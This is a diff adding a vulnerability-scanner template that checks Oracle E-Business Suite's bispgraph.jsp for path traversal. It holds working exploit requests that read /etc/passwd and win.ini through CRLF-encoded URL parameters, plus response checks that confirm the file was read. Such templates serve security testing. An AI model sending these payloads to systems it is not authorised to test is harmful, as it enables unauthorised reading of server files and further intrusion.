@@ -1,0 +1,35 @@
+id: oracle-ebs-lfi
+info:
+  name: Oracle EBS bispgrapgh Path Traversal
+  risk: High
+  confidence: Certain
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("body", "root:") && StringSearch("body", "bin/bash")
+
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=win.ini&ifl=c:/windows/
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && (StringSearch("response", "[extensions]") || StringSearch("response", "[fonts]"))
+
+references:
+  - links:
+      - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
+      - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+      - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
